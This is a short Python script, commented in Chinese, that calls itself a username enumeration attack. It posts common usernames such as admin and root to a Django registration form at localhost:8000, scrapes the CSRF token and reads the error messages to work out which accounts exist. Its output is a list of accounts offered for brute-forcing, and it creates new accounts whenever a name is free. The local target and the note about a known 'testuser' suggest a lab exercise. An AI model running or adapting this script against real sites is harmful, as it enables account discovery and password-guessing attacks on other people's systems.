#!/usr/bin/env python3
"""
使用者名稱列舉攻擊腳本

用途：自動化測試常見的使用者名稱是否存在於系統中
"""

import requests
from bs4 import BeautifulSoup

# 目標 URL
TARGET_URL = "http://localhost:8000/accounts/register/"

# 常見使用者名稱列表
USERNAMES = [
    "admin",
    "administrator",
    "root",
    "user",
    "test",
    "guest",
    "demo",
    "webmaster",
    "support",
    "testuser",  # 我們知道這個存在
]


def get_csrf_token(session, url):
    """取得 CSRF token"""
    response = session.get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    csrf_token = soup.find("input", {"name": "csrfmiddlewaretoken"})
    return csrf_token["value"] if csrf_token else None


def test_username(session, username):
    """測試使用者名稱是否存在"""
    csrf_token = get_csrf_token(session, TARGET_URL)

    data = {
        "username": username,
        "email": f"{username}@test.com",
        "password": "password123",
        "password_confirm": "password123",
        "csrfmiddlewaretoken": csrf_token,
    }

    response = session.post(TARGET_URL, data=data)

    # 分析回應
    if "此使用者名稱已被使用" in response.text:
        return True, "使用者名稱已存在"
    elif "此 Email 已被使用" in response.text:
        return True, "Email 已存在（使用者可能存在）"
    elif "註冊成功" in response.text or response.status_code == 302:
        return False, "使用者名稱不存在（已建立新帳號）"
    else:
        return None, "無法確定"


def main():
    """主函數"""
    session = requests.Session()

    print("=" * 60)
    print("使用者名稱列舉攻擊")
    print("=" * 60)
    print(f"目標: {TARGET_URL}")
    print(f"測試 {len(USERNAMES)} 個使用者名稱\n")

    found_users = []

    for username in USERNAMES:
        exists, message = test_username(session, username)

        if exists:
            print(f"[+] 找到使用者: {username:20s} - {message}")
            found_users.append(username)
        elif exists is False:
            print(f"[-] 不存在:     {username:20s}")
        else:
            print(f"[?] 無法確定:   {username:20s} - {message}")

    print("\n" + "=" * 60)
    print(f"總結: 找到 {len(found_users)} 個存在的使用者")
    print("=" * 60)

    if found_users:
        print("\n可用於暴力破解的帳號列表:")
        for user in found_users:
            print(f"  - {user}")


if __name__ == "__main__":
    main()
